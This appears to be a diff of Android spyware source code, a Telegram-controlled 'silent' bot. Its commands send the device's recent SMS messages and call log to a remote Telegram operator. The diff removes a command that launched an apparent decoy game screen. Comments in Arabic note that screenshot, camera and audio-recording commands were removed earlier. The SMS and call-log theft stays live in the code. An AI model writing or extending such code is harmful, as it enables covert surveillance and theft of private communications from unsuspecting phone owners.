@@ -2,7 +2,6 @@ package com.silent.telebot;
 
 import android.content.ContentResolver;
 import android.content.Context;
-import android.content.Intent;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Build;
@@ -71,27 +70,20 @@ public class TelegramPoller implements Runnable {
     }
 
     // ============================================================
-    //  📋 معالجة الأوامر (تم إزالة /screenshot, /take_pic, /record)
+    //  📋 معالجة الأوامر (تم إزالة /play و /screenshot و /take_pic و /record)
     // ============================================================
     private void handleCommand(String cmd) {
         try {
             if (cmd.equals("/help")) {
                 sendMessage("📋 الأوامر المتاحة:\n" +
                         "/get_sms - عرض آخر 10 رسائل\n" +
-                        "/get_calls - عرض آخر 10 مكالمات\n" +
-                        "/play - فتح اللعبة");
+                        "/get_calls - عرض آخر 10 مكالمات");
             }
             else if (cmd.equals("/get_sms")) {
                 sendMessage(getSms());
             }
             else if (cmd.equals("/get_calls")) {
                 sendMessage(getCalls());
-            }
-            else if (cmd.equals("/play")) {
-                Intent intent = new Intent(ctx, WordOrderActivity.class);
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                ctx.startActivity(intent);
-                sendMessage("🎮 تم فتح اللعبة!");
             }
             else {
                 sendMessage("❌ أمر غير معروف. استخدم /help");
@@ -239,4 +231,4 @@ public class TelegramPoller implements Runnable {
             conn.disconnect();
         } catch (Exception ignored) {}
     }
-            } 
+    } 
